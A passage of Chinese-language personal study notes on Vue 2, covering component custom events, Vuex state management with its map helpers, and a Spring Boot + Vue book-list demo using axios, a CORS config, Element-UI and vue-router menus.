> 	export default {
> 		name:'Student',
> 		data() {
> 			return {
> 				name:'张三',
> 				sex:'男',
> 				number:0
> 			}
> 		},
> 		methods: {
> 			add(){
> 				console.log('add回调被调用了')
> 				this.number++
> 			},
> 			sendStudentlName(){
> 				//触发Student组件实例身上的atguigu事件
> 				this.$emit('atguigu',this.name,666,888,900)
> 				// this.$emit('demo')
> 				// this.$emit('click')
> 			},
> 			unbind(){
> 				this.$off('atguigu') //解绑一个自定义事件
> 				// this.$off(['atguigu','demo']) //解绑多个自定义事件
> 				// this.$off() //解绑所有的自定义事件
> 			},
> 			death(){
> 				this.$destroy() //销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效。
> 			}
> 		},
> 	}
> </script>
> 
> <style lang="less" scoped>
> 	.student{
> 		background-color: pink;
> 		padding: 5px;
> 		margin-top: 30px;
> 	}
> </style>
> ```
>
> School.vue
>
> ```vue
> <template>
> 	<div class="school">
> 		<h2>学校名称：{{name}}</h2>
> 		<h2>学校地址：{{address}}</h2>
> 		<button @click="sendSchoolName">把学校名给App</button>
> 	</div>
> </template>
> 
> <script>
> 	export default {
> 		name:'School',
> 		props:['getSchoolName'],
> 		data() {
> 			return {
> 				name:'尚硅谷',
> 				address:'北京',
> 			}
> 		},
> 		methods: {
> 			sendSchoolName(){
> 				this.getSchoolName(this.name)
> 			}
> 		},
> 	}
> </script>
> 
> <style scoped>
> 	.school{
> 		background-color: skyblue;
> 		padding: 5px;
> 	}
> </style>
> ```



略过p82~p104



### VUEX

#### 1.概念

 在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

#### 2.何时使用？

 多个组件需要共享数据时

> 求和案例，纯vue版本
>
> <img src="Akio's Book.assets/image-20220124102309520.png" alt="image-20220124102309520" style="zoom:67%;" />
>
> Count.vue
>
> ```vue
> <template>
> 	<div>
> 		<h1>当前求和为：{{sum}}</h1>
> 		<select v-model.number="n">	<!-- number -->
> 			<option value="1">1</option>
> 			<option value="2">2</option>
> 			<option value="3">3</option>
> 		</select>
> 		<button @click="increment">+</button>
> 		<button @click="decrement">-</button>
> 		<button @click="incrementOdd">当前求和为奇数再加</button>
> 		<button @click="incrementWait">等一等再加</button>
> 	</div>
> </template>
> 
> <script>
> 	export default {
> 		name:'Count',
> 		data() {
> 			return {
> 				n:1, //用户选择的数字
> 				sum:0 //当前的和
> 			}
> 		},
> 		methods: {
> 			increment(){
> 				this.sum += this.n
> 			},
> 			decrement(){
> 				this.sum -= this.n
> 			},
> 			incrementOdd(){
> 				if(this.sum % 2){
> 					this.sum += this.n
> 				}
> 			},
> 			incrementWait(){
> 				setTimeout(()=>{
> 					this.sum += this.n
> 				},500)
> 			},
> 		},
> 	}
> </script>
> 
> <style lang="css">
> 	button{
> 		margin-left: 5px;
> 	}
> </style>
> ```
>
> App.vue
>
> ```vue
> <template>
> 	<div>
> 		<Count/>
> 	</div>
> </template>
> 
> <script>
> 	import Count from './components/Count'
> 	export default {
> 		name:'App',
> 		components:{Count},
> 	}
> </script>
> ```



#### 3、vuex工作原理图

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=107&spm_id_from=pageDriver

Actions、Mutations、State都是对象类型，统受store管理

<img src="Akio's Book.assets/image-20220124103153603.png" alt="image-20220124103153603" style="zoom:67%;" />

使用vuex不能脱离以下四步：

```html
npm i vuex 	//安装vuex
Vue.use(Vuex)	//使用vuex
创建store
让所有的vuecompent都能看见这个store
```



#### 4、求和案例的vuex版本

<img src="Akio's Book.assets/image-20220124111033077.png" alt="image-20220124111033077" style="zoom:60%;" />

App.vue

```vue
<template>
	<div>
		<Count/>
	</div>
</template>

<script>
	import Count from './components/Count'
	export default {
		name:'App',
		components:{Count},
		mounted() {
			// console.log('App',this)
		},
	}
</script>
```

main.js

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入插件
import vueResource from 'vue-resource'
//引入store
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false
//使用插件
Vue.use(vueResource)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store,
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

Count.vue

```vue
<template>
	<div>
		<h1>当前求和为：{{$store.state.sum}}</h1>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
	export default {
		name:'Count',
		data() {
			return {
				n:1, //用户选择的数字
			}
		},
		methods: {
			increment(){
				this.$store.commit('JIA',this.n)
			},
			decrement(){
				this.$store.commit('JIAN',this.n)
			},
			incrementOdd(){
				this.$store.dispatch('jiaOdd',this.n)
			},
			incrementWait(){
				this.$store.dispatch('jiaWait',this.n)
			},
		},
		mounted() {
			console.log('Count',this)
		},
	}
</script>

<style lang="css">
	button{
		margin-left: 5px;
	}
</style>
```

store/index.js

```javascript
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions——用于响应组件中的动作
const actions = {
	/* jia(context,value){
		console.log('actions中的jia被调用了')
		context.commit('JIA',value)
	},
	jian(context,value){
		console.log('actions中的jian被调用了')
		context.commit('JIAN',value)
	}, */
	jiaOdd(context,value){//context是包装好的上下文对象，存放了又能能用到的方法，commit就存放在其中
		console.log('actions中的jiaOdd被调用了')
		if(context.state.sum % 2){
			context.commit('JIA',value)
		}
	},
	jiaWait(context,value){
		console.log('actions中的jiaWait被调用了')
		setTimeout(()=>{
			context.commit('JIA',value)
		},500)
	}
}
//准备mutations——用于操作数据（state）
const mutations = {
	JIA(state,value){
		console.log('mutations中的JIA被调用了')
		state.sum += value
	},
	JIAN(state,value){
		console.log('mutations中的JIAN被调用了')
		state.sum -= value
	}
}
//准备state——用于存储数据
const state = {
	sum:0 //当前的和
}

//创建并暴露store
export default new Vuex.Store({
	actions,	//actions: actions 重名，触发简写
	mutations,
	state,
})
```



#### 5、搭建环境

1. 创建文件：`src/store/index.js`

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //应用Vuex插件
   Vue.use(Vuex)
   
   //准备actions对象——响应组件中用户的动作
   const actions = {}
   //准备mutations对象——修改state中的数据
   const mutations = {}
   //准备state对象——保存具体的数据
   const state = {}
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state
   })
   ```

2. 在`main.js`中创建vm时传入`store`配置项

   ```js
   ......
   //引入store
   import store from './store'
   ......
   
   //创建vm
   new Vue({
   	el:'#app',
   	render: h => h(App),
   	store
   })
   ```



#### 6、基本使用

##### actions\mutations\state

1. 初始化数据、配置`actions`、配置`mutations`，操作文件`store.js`

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //引用Vuex
   Vue.use(Vuex)
   
   const actions = {
       //响应组件中加的动作
   	jia(context,value){
   		// console.log('actions中的jia被调用了',miniStore,value)
   		context.commit('JIA',value)
           //当然，如果逻辑复杂了，还可以再dispatch
           //context.dispatch('demo', value)
   	},
       
       demo(context, value) {
           ...
           context.commit('JIA',value)
       }
   }
   
   const mutations = {
       //执行加
   	JIA(state,value){
   		// console.log('mutations中的JIA被调用了',state,value)
   		state.sum += value
   	}
   }
   
   //初始化数据
   const state = {
      sum:0
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state,
   })
   ```

2. 组件中读取vuex中的数据：`$store.state.sum`

3. 组件中修改vuex中的数据：`$store.dispatch('action中的方法名',数据)` 或 `$store.commit('mutations中的方法名',数据)`

   > 备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写`dispatch`，直接编写`commit`



##### getters

> ### getters的使用
>
> 1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。
>
> 2. 在`store.js`中追加`getters`配置
>
>    ```js
>    ......
>    
>    const getters = {
>    	bigSum(state){
>    		return state.sum * 10
>    	}
>    }
>    
>    //创建并暴露store
>    export default new Vuex.Store({
>    	......
>    	getters
>    })
>    ```
>
> 3. 组件中读取数据：`$store.getters.bigSum`
>
> #### 示例
>
> 根据上一小节的示例，我们可以完成一个按钮，实现x10的效果
>
> store/index.js
>
> ```javascript
> //该文件用于创建Vuex中最为核心的store
> import Vue from 'vue'
> //引入Vuex
> import Vuex from 'vuex'
> //应用Vuex插件
> Vue.use(Vuex)
> 
> //准备actions——用于响应组件中的动作
> const actions = {
> 	/* jia(context,value){
> 		console.log('actions中的jia被调用了')
> 		context.commit('JIA',value)
> 	},
> 	jian(context,value){
> 		console.log('actions中的jian被调用了')
> 		context.commit('JIAN',value)
> 	}, */
> 	jiaOdd(context,value){
> 		console.log('actions中的jiaOdd被调用了')
> 		if(context.state.sum % 2){
> 			context.commit('JIA',value)
> 		}
> 	},
> 	jiaWait(context,value){
> 		console.log('actions中的jiaWait被调用了')
> 		setTimeout(()=>{
> 			context.commit('JIA',value)
> 		},500)
> 	}
> }
> //准备mutations——用于操作数据（state）
> const mutations = {
> 	JIA(state,value){
> 		console.log('mutations中的JIA被调用了')
> 		state.sum += value
> 	},
> 	JIAN(state,value){
> 		console.log('mutations中的JIAN被调用了')
> 		state.sum -= value
> 	}
> }
> //准备state——用于存储数据
> const state = {
> 	sum:0 //当前的和
> }
> //准备getters——用于将state中的数据进行加工
> const getters = {
> 	bigSum(state){
> 		return state.sum*10
> 	}
> }
> 
> //创建并暴露store
> export default new Vuex.Store({
> 	actions,
> 	mutations,
> 	state,
> 	getters
> })
> ```
>
> Count.vue
>
> ```vue
> <template>
> 	<div>
> 		<h1>当前求和为：{{$store.state.sum}}</h1>
> 		<h3>当前求和放大10倍为：{{$store.getters.bigSum}}</h3>
> 		<select v-model.number="n">
> 			<option value="1">1</option>
> 			<option value="2">2</option>
> 			<option value="3">3</option>
> 		</select>
> 		<button @click="increment">+</button>
> 		<button @click="decrement">-</button>
> 		<button @click="incrementOdd">当前求和为奇数再加</button>
> 		<button @click="incrementWait">等一等再加</button>
> 	</div>
> </template>
> 
> <script>
> 	export default {
> 		name:'Count',
> 		data() {
> 			return {
> 				n:1, //用户选择的数字
> 			}
> 		},
> 		methods: {
> 			increment(){
> 				this.$store.commit('JIA',this.n)
> 			},
> 			decrement(){
> 				this.$store.commit('JIAN',this.n)
> 			},
> 			incrementOdd(){
> 				this.$store.dispatch('jiaOdd',this.n)
> 			},
> 			incrementWait(){
> 				this.$store.dispatch('jiaWait',this.n)
> 			},
> 		},
> 		mounted() {
> 			console.log('Count',this.$store)
> 		},
> 	}
> </script>
> 
> <style lang="css">
> 	button{
> 		margin-left: 5px;
> 	}
> </style>
> ```
>
> main.js
>
> ```javascript
> //引入Vue
> import Vue from 'vue'
> //引入App
> import App from './App.vue'
> //引入插件
> import vueResource from 'vue-resource'
> //引入store
> import store from './store'
> 
> //关闭Vue的生产提示
> Vue.config.productionTip = false
> //使用插件
> Vue.use(vueResource)
> 
> //创建vm
> new Vue({
> 	el:'#app',
> 	render: h => h(App),
> 	store,
> 	beforeCreate() {
> 		Vue.prototype.$bus = this
> 	}
> })
> ```
>
> <img src="Akio's Book.assets/image-20220124201000582.png" alt="image-20220124201000582" style="zoom:67%;" />



##### 优化：mapState\mapGetters

> 通过上几节代码我们发现，像括号中这样写代码太冗余，一般都是再插值{{}}中不写太复杂的代码。但是就算是用computed计算属性也仍然还是要写重复代码
>
> <img src="Akio's Book.assets/image-20220124203222642.png" alt="image-20220124203222642" style="zoom:67%;" />
>
> 计算属性
>
> <img src="Akio's Book.assets/image-20220124203515966.png" alt="image-20220124203515966" style="zoom:50%;" />
>
> 所以，，所以mapState\mapGetters生成重复代码很有必要
>
> 所以调整Count.vue
>
> ```vue
> <template>
> 	<div>
> 		<h1>当前求和为：{{sum}}</h1>
> 		<h3>当前求和放大10倍为：{{bigSum}}</h3>
> 		<h3>我在{{school}}，学习{{subject}}</h3>
> 		<select v-model.number="n">
> 			<option value="1">1</option>
> 			<option value="2">2</option>
> 			<option value="3">3</option>
> 		</select>
> 		<button @click="increment">+</button>
> 		<button @click="decrement">-</button>
> 		<button @click="incrementOdd">当前求和为奇数再加</button>
> 		<button @click="incrementWait">等一等再加</button>
> 	</div>
> </template>
> 
> <script>
> 	import {mapState,mapGetters} from 'vuex'
> 	export default {
> 		name:'Count',
> 		data() {
> 			return {
> 				n:1, //用户选择的数字
> 			}
> 		},
> 		computed:{
> 			//靠程序员自己亲自去写计算属性
> 			/* 
> 			sum(){
> 				return this.$store.state.sum
> 			},
> 			school(){
> 				return this.$store.state.school
> 			},
> 			subject(){
> 				return this.$store.state.subject
> 			}, 
> 			*/
> 
> 			//借助mapState生成计算属性，从state中读取数据。（对象写法）
> 			// ...表示将其中的每一项都展开存入
> 			// ...mapState({sum:'sum', school:'school', subject:'subject'}),	//原本是'sum':'sum'都有''
> 
> 			//借助mapState生成计算属性，从state中读取数据。（数组写法）
> 			...mapState(['sum','school','subject']),
> 
> 			/* ******************************************************************** */
> 
> 			/* bigSum(){
> 				return this.$store.getters.bigSum
> 			}, */
> 
> 			//借助mapGetters生成计算属性，从getters中读取数据。（对象写法）
> 			// ...mapGetters({bigSum:'bigSum'})
> 			
> 			//借助mapGetters生成计算属性，从getters中读取数据。（数组写法）
> 			...mapGetters(['bigSum'])
> 
> 		},
> 		methods: {
> 			increment(){
> 				this.$store.commit('JIA',this.n)
> 			},
> 			decrement(){
> 				this.$store.commit('JIAN',this.n)
> 			},
> 			incrementOdd(){
> 				this.$store.dispatch('jiaOdd',this.n)
> 			},
> 			incrementWait(){
> 				this.$store.dispatch('jiaWait',this.n)
> 			},
> 		},
> 		mounted() {
> 			const x = mapState({he:'sum',xuexiao:'school',xueke:'subject'})
> 			console.log(x)
> 		},
> 	}
> </script>
> 
> <style lang="css">
> 	button{
> 		margin-left: 5px;
> 	}
> </style>
> ```



##### 优化：mapActions\mapMutations





##### 以上四个map总结

> 1. **mapState方法：**用于帮助我们映射`state`中的数据为计算属性
>
>    ```js
>    computed: {
>        //借助mapState生成计算属性：sum、school、subject（对象写法）
>         ...mapState({sum:'sum',school:'school',subject:'subject'}),
>             
>        //借助mapState生成计算属性：sum、school、subject（数组写法）
>        ...mapState(['sum','school','subject']),
>    },
>    ```
>
> 2. **mapGetters方法：**用于帮助我们映射`getters`中的数据为计算属性
>
>    ```js
>    computed: {
>        //借助mapGetters生成计算属性：bigSum（对象写法）
>        ...mapGetters({bigSum:'bigSum'}),
>    
>        //借助mapGetters生成计算属性：bigSum（数组写法）
>        ...mapGetters(['bigSum'])
>    },
>    ```
>
> 3. **mapActions方法：**用于帮助我们生成与`actions`对话的方法，即：包含`$store.dispatch(xxx)`的函数
>
>    ```js
>    methods:{
>        //靠mapActions生成：incrementOdd、incrementWait（对象形式）
>        ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
>    
>        //靠mapActions生成：incrementOdd、incrementWait（数组形式）
>        ...mapActions(['jiaOdd','jiaWait'])
>    }
>    ```
>
> 4. **mapMutations方法：**用于帮助我们生成与`mutations`对话的方法，即：包含`$store.commit(xxx)`的函数
>
>    ```js
>    methods:{
>        //靠mapActions生成：increment、decrement（对象形式）
>        ...mapMutations({increment:'JIA',decrement:'JIAN'}),
>        
>        //靠mapMutations生成：JIA、JIAN（对象形式）
>        ...mapMutations(['JIA','JIAN']),
>    }
>    ```
>
> > 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。





## VUE实战

https://www.bilibili.com/video/BV1x64y1S7S7?from=search&seid=13120601889511423979&spm_id_from=333.337.0.0

https://www.bilibili.com/video/BV137411B7vB?spm_id_from=333.999.0.0	SpringBoot+Vue

### 前后端分离 

前后端分离就是将⼀个应⽤的前端代码和后端代码分开写，为什么要这样做？ 

如果不使⽤前后端分离的⽅式，会有哪些问题？ 
传统的 Java Web 开发中，前端使⽤ JSP 开发，JSP 不是由后端开发者来独⽴完成的。 
前端---》HTML 静态⻚⾯ ---〉后端 ---》JSP 

这种开发⽅式效率极低，可以使⽤前后端分离的⽅式进⾏开发，就可以完美地解决这⼀问题。 

前端只需要独⽴编写客户端代码，后端也只需要独⽴编写服务端代码提供数据接⼝即可。 

前端通过 Ajax 请求来访问后端的数据接⼝，将 Model 展示到 View 中即可。 

前后端开发者只需要提前约定好接⼝⽂档（URL、参数、数据类型...），然后分别独⽴开发即可，前端 可以造假数据进⾏测试，完全不需要依赖于后端，最后完成前后端集成即可，真正实现了前后端应⽤的 解耦合，极⼤地提升了开发效率。 

单体项目变成---》前端应⽤ + 后端应⽤ 

前端应⽤：负责数据展示和⽤户交互。 

后端应⽤：负责提供数据处理接⼝。

前端 HTML ---》Ajax ---〉RESTful 后端数据接⼝。 

**传统的单体应⽤**

<img src="Akio's Book.assets/image-20220116140419914.png" alt="image-20220116140419914" style="zoom:67%;" />

**前后端分离的结构**

<img src="Akio's Book.assets/image-20220116140444949.png" alt="image-20220116140444949" style="zoom:67%;" />

前后端分离就是将⼀个单体应⽤拆分成两个独⽴的应⽤，前端应⽤和后端应⽤以 JSON 格式进⾏数据交 互



### 实现技术

Spring Boot + Vue 使⽤ Spring Boot 进⾏后端应⽤开发，使⽤ Vue 进⾏前端应⽤开发



### VUE前端框架搭建

https://blog.csdn.net/dream_summer/article/details/108867317



### VUE项目开始

<img src="Akio's Book.assets/image-20220116150826186.png" alt="image-20220116150826186" style="zoom:67%;" />

![image-20220116151310155](Akio's Book.assets/image-20220116151310155.png)

<img src="Akio's Book.assets/image-20220116151453798.png" alt="image-20220116151453798" style="zoom:50%;" />

<img src="Akio's Book.assets/image-20220116151526170.png" alt="image-20220116151526170" style="zoom:67%;" />

<img src="Akio's Book.assets/image-20220116151749164.png" alt="image-20220116151749164" style="zoom:50%;" />

<img src="Akio's Book.assets/image-20220116151849869.png" alt="image-20220116151849869" style="zoom:50%;" />

<img src="Akio's Book.assets/image-20220116154425883.png" alt="image-20220116154425883" style="zoom:50%;" />

<img src="Akio's Book.assets/image-20220116154757573.png" alt="image-20220116154757573" style="zoom:50%;" />

以上操作就创建了一个Vue项目并将其运行了起来，平时我们开发Vue的时候直接使用Idea进行开发就可以



### 开发VUE

使用idea，将VUE项目导入，用idea开发vue必须要安装vue.js插件

<img src="Akio's Book.assets/image-20220116154953694.png" alt="image-20220116154953694" style="zoom:50%;" />

---

<img src="Akio's Book.assets/image-20220117091031774.png" alt="image-20220117091031774" style="zoom:50%;" />

如果如上图红框的位置报错，一般都是js版本过低，VUE支持的js版本是6，我们只需要更改一下idea的js版本

<img src="Akio's Book.assets/image-20220117091155252.png" alt="image-20220117091155252" style="zoom:67%;" />

---

<img src="Akio's Book.assets/image-20220117091620420.png" alt="image-20220117091620420" style="zoom:80%;" />

`npm run serve`就可以启动当前服务，这个和之前的`vue ui`不一样，App.vue文件就是下图的主窗口

<img src="Akio's Book.assets/image-20220117091731502.png" alt="image-20220117091731502" style="zoom:50%;" />

---

路由器router.js，引入vue都要在这里面注册，同时这也有两种注册方法routes中

```vue
//第一种
import Home from ''
routes: [
    {
      path: '/',
      name: 'home',
      component: Home
    },
]
//第二种
routes: [
    {
      path: '/about',
      name: 'about',
      // route level code-splitting
      // this generates a separate chunk (about.[hash].js) for this route
      // which is lazy-loaded when the route is visited.
      component: () => import(/* webpackChunkName: "about" */ './views/About.vue')	//代替import
    }
  ]
```

![image-20220117104931513](Akio's Book.assets/image-20220117104931513.png)

<img src="Akio's Book.assets/image-20220117105546425.png" alt="image-20220117105546425" style="zoom:50%;" />

<img src="Akio's Book.assets/image-20220117105603495.png" alt="image-20220117105603495" style="zoom:67%;" />



### Vue端

> 添加一个Vue页面Book.vue
>
> <img src="Akio's Book.assets/image-20220117113014749.png" alt="image-20220117113014749" style="zoom:50%;" />
>
> ```vue
> <template>
>     <div>
>         <table>
>             <tr>
>                 <td>编号</td>
>                 <td>图书名称</td>
>                 <td>作者</td>
>             </tr>
>             <tr v-for="book in books">
>                 <td v-text="book.id"></td>
>                 <td v-text="book.name"></td>
>                 <td v-text="book.author"></td>
>             </tr>
>         </table>
>     </div>
> </template>
> 
> <script>
>     export default {
>         name: "Book",
>         data() {
>             return {
>                 books:[
>                     {
>                         id: 1,
>                         name:'Grant\'s book',
>                         author:'Grant'
>                     },
>                     {
>                         id: 2,
>                         name:'Grant\'s book',
>                         author:'Grant'
>                     },
>                     {
>                         id: 3,
>                         name:'Grant\'s book',
>                         author:'Grant'
>                     }
>                 ]
>             }
>         }
>     }
> </script>
> 
> <style scoped>
> 
> </style>
> ```
>
> 在路由router.js中将其绑定
>
> <img src="Akio's Book.assets/image-20220117113124159.png" alt="image-20220117113124159" style="zoom:50%;" />
>
> <img src="Akio's Book.assets/image-20220117113216276.png" alt="image-20220117113216276" style="zoom:67%;" />
>
> 此时`npm run serve`启动vue，直接可以网页上通过路由访问
>
> <img src="Akio's Book.assets/image-20220117113333362.png" alt="image-20220117113333362" style="zoom:50%;" />
>
> 不过到现在都是假数据，等到后端写好接口后，我们就可以通过axios请求，来发送请求获取数据
>
> 首先先安装axios这个组件，`vue add axios`
>
> <img src="Akio's Book.assets/image-20220117113716408.png" alt="image-20220117113716408" style="zoom:50%;" /><img src="Akio's Book.assets/image-20220117113834818.png" alt="image-20220117113834818" style="zoom:67%;" />
>
> 然后编写axios请求
>
> ```java
> <template>
>     <div>
>         <table>
>             <tr>
>                 <td>编号</td>
>                 <td>图书名称</td>
>                 <td>作者</td>
>             </tr>
>             <tr v-for="book in books">
>                 <td v-text="book.id"></td>
>                 <td v-text="book.name"></td>
>                 <td v-text="book.author"></td>
>             </tr>
>         </table>
>     </div>
> </template>
> 
> <script>
>     export default {
>         name: "Book",
>         data() {
>             return {
>                 books:[]
>             }
>         },
>         created() {
>             this.loadBooks();
>         },
>         methods:{
>             loadBooks(){
>                 const _this = this;
>                 axios({
>                     url:'http://localhost:8181/book/findAll',
>                     method:'get'
>                 }).then(function (response) {
>                     _this.books = response.data;
>                 })
>             }
>         }
>     }
> </script>
> 
> <style scoped>
> 
> </style>
> ```
>
> <img src="Akio's Book.assets/image-20220117135229134.png" alt="image-20220117135229134" style="zoom:50%;" />
>
> 

### Springboot端

> 创建项目时引入依赖
>
> <img src="Akio's Book.assets/image-20220117111539120.png" alt="image-20220117111539120" style="zoom:50%;" />
>
> 创建Book实体
>
> <img src="Akio's Book.assets/image-20220118094534758.png" alt="image-20220118094534758" style="zoom:50%;" />
>
> 编写对应数据库接口
>
> <img src="Akio's Book.assets/image-20220117111740918.png" alt="image-20220117111740918" style="zoom:60%;" />
>
> 为这个接口编写测试类
>
> <img src="Akio's Book.assets/image-20220117111840957.png" alt="image-20220117111840957" style="zoom:50%;" />
>
> <img src="Akio's Book.assets/image-20220117111914389.png" alt="image-20220117111914389" style="zoom:43%;" />
>
> <img src="Akio's Book.assets/image-20220117112723399.png" alt="image-20220117112723399" style="zoom:50%;" />
>
> 测试ok后，写controller
>
> <img src="Akio's Book.assets/image-20220117112753401.png" alt="image-20220117112753401" style="zoom:50%;" />
>
> 然后，启动项目，此时端口是8181，启动成功后就可以等待VUE项目向此端口发送axios请求，来请求数据
>
> ![image-20220117115750727](Akio's Book.assets/image-20220117115750727.png)
>
> 但是上图有一个问题，就是vue请求过来是跨域请求，所以需要开放跨域config
>
> <img src="Akio's Book.assets/image-20220117114930473.png" alt="image-20220117114930473" style="zoom:50%;" />
>
> ```java
> @Configuration
> public class CrosConfig implements WebMvcConfigurer {
> 
>     @Override
>     public void addCorsMappings(CorsRegistry registry) {
>         registry.addMapping("/**")
>                 .allowedOriginPatterns("*")
>                 .allowedMethods("GET", "HEAD", "POST", "PUT", "DELETE", "OPTIONS")
>                 .allowCredentials(true)
>                 .maxAge(3600)
>                 .allowedHeaders("*");
>     }
> }
> ```



### Element-ui的使用

#### 安装element ui

> 启动vue-ui控制台
>
> <img src="Akio's Book.assets/image-20220117144703478.png" alt="image-20220117144703478" style="zoom:50%;" />
>
> 找到自己的项目，选择插件，搜索element-ui安装
>
> ![image-20220117145155657](Akio's Book.assets/image-20220117145155657.png)
>
> 虽然安装了这个插件，但还没有导入到我们这个项目中来，使用`cnpm install --save element-ui`安装一下
>
> 如果cnpm没有安装，可以先使用`npm install -g cnpm --registry=https://registry.npm.taobao.org`进行安装
>
> <img src="Akio's Book.assets/image-20220117155544305.png" alt="image-20220117155544305" style="zoom:67%;" />
>
> 然后`npm run serve`启动当前项目，可以看到页面上有这个按钮就表示安装成功
>
> <img src="Akio's Book.assets/image-20220117155759814.png" alt="image-20220117155759814" style="zoom:47%;" />



#### 使用Element-ui

https://www.bilibili.com/video/BV137411B7vB?p=2&spm_id_from=pageDriver

> 以上我们安装完成了element-ui,可以直接去他的官网使用对应组件即可
>
> https://element.eleme.cn/#/zh-CN/component/installation	基于VUE 2.*
>
> https://element-plus.gitee.io/zh-CN/	基于VUE 3.*
>
> 使用element-ui制作后台
>
> 先填充布局，采用后台布局，将代码覆盖App.vue
>
> ![image-20220117163203679](Akio's Book.assets/image-20220117163203679.png)
>
> <img src="Akio's Book.assets/image-20220117163301136.png" alt="image-20220117163301136" style="zoom: 58%;" />
>
> <img src="Akio's Book.assets/image-20220117163110379.png" alt="image-20220117163110379" style="zoom:70%;" />
>
> <img src="Akio's Book.assets/image-20220117163344651.png" alt="image-20220117163344651" style="zoom:50%;" />



#### Vue router 来动态构建左侧菜单

<img src="Akio's Book.assets/image-20220117170452260.png" alt="image-20220117170452260" style="zoom:67%;" /><img src="Akio's Book.assets/image-20220117201627255.png" alt="image-20220117201627255" style="zoom:67%;" />

编辑App.vue

```vue
<template>
  <div id="app">
    <el-container style="height: 500px; border: 1px solid #eee">

      <el-aside width="200px" style="background-color: rgb(238, 241, 246)">
        <el-menu>
          <el-submenu v-for="(item,index) in $router.options.routes" :index="index+''">
            <template slot="title"><i class="el-icon-setting"></i>{{item.name}}</template>
            <el-menu-item v-for="(item2,index2) in item.children" :index="index+'-'+index2">{{item2.name}}</el-menu-item>
          </el-submenu>
        </el-menu>
      </el-aside>

      <el-main>
        <router-view></router-view>
      </el-main>
    </el-container>
  </div>
</template>

<style>
  .el-header {
    background-color: #B3C0D1;
    color: #333;
    line-height: 60px;
  }

  .el-aside {
    color: #333;
  }
</style>

<script>
  export default {
    data() {
      return {
      }
    }
  };
</script>
```

router.js

```js
import Vue from 'vue'
import Router from 'vue-router'
import App from "./App";
import PageOne from "./views/PageOne";
import PageTwo from "./views/PageTwo";
import PageThree from "./views/PageThree";
import PageFour from "./views/PageFour";

Vue.use(Router)

export default new Router({
  mode: 'history',
  base: process.env.BASE_URL,
  routes: [
    {
      path: '/',
      name: '导航1',
      component: App,
      children:[
        {
          path: '/pageOne',
          name: 'pageOne',
          component: PageOne
        },
        {
          path: '/pageTwo',
          name: 'pageTwo',
          component: PageTwo
        }
      ]
    },
    {
      path: '/nav',
      name: '导航2',
      component: App,
      children:[
        {
          path: '/pageThree',
          name: 'pageThree',
          component: PageThree
        },
        {
          path: '/pageFour',
          name: 'pageFour',
          component: PageFour
        }
      ]
    }
  ]
})
```

访问localhost:8080/pageTwo

<img src="Akio's Book.assets/image-20220117202435649.png" alt="image-20220117202435649" style="zoom:67%;" />

页面虽然显示出来了，但是有点嵌套的感觉，为什么会嵌套呢？

> <img src="Akio's Book.assets/image-20220117204652580.png" alt="image-20220117204652580" style="zoom:50%;" />
>
> 注意`<router-view></router-view>`是**用来渲染通过路由映射过来的组件**，红色的是资源，黄色区域不是一个资源，只是一个窗口，所以说无论你访问什么页面，先展示的都是App.vue的资源，然后内容都会加载到黄色区域（先加载父，后加载children），即`<router-view></router-view>`，但是按我们上面的App.vue，已经写好了如下这部分，所以说访问什么页面都会带着，我们改变访问路径只是变动`<router-view></router-view>`中的信息，即黄色区域
>
> <img src="Akio's Book.assets/image-20220117204918642.png" alt="image-20220117204918642" style="zoom:67%;" />





#### 设置动态路由导航栏

了解上述机制后，我们就可以修改我们的代码

App.vue中修改<template>

```vue
<template>
  <div id="app">
    <router-view></router-view>
  </div>
</template>
```

添加一个index.vue用于存放导航栏

![image-20220117205344006](Akio's Book.assets/image-20220117205344006.png)

router.js

<img src="Akio's Book.assets/image-20220117205436940.png" alt="image-20220117205436940" style="zoom:67%;" />

> 梳理一下，当我们访问/，先把Index中的页面加载出来了，然后访问/pageOne，就把页面加载到了Index页面中的`<router-view></router-view>`中，嵌套起来了。
>
> <img src="Akio's Book.assets/image-20220117210044534.png" alt="image-20220117210044534" style="zoom:50%;" />
>
> 其实简单点理解，上图本身就是父子关系，而Index页面中的`<router-view></router-view>`不正是为children准备的吗

现在访问不会再嵌套，接下来优化1、点击变色2、点击导航跳转不同页面

> menu 与 router 的绑定 
>
> 1、 标签添加 router 属性。
>
> 2、在⻚⾯中添加 标签，它是⼀个容器，动态渲染你选择的 router。 
>
> 3、 标签的 index 值就是要跳转的 router

Index.vue

```vue
<template>
    <el-container style="height: 500px; border: 1px solid #eee">

        <el-aside width="200px" style="background-color: rgb(238, 241, 246)">
            <el-menu router :default-openeds="['0', '1']"> //0，1导航栏展开
                <el-submenu v-for="(item,index) in $router.options.routes" :index="index+''">
                    <template slot="title">{{item.name}}</template>
                    <el-menu-item v-for="(item2,index2) in item.children" :index="item2.path"//点击跳转
                                  :class="$route.path==item2.path?'is-active':''">{{item2.name}}</el-menu-item>
                </el-submenu>
            </el-menu>
        </el-aside>

        <el-main>
            <router-view></router-view>
        </el-main>
    </el-container>
</template>
```

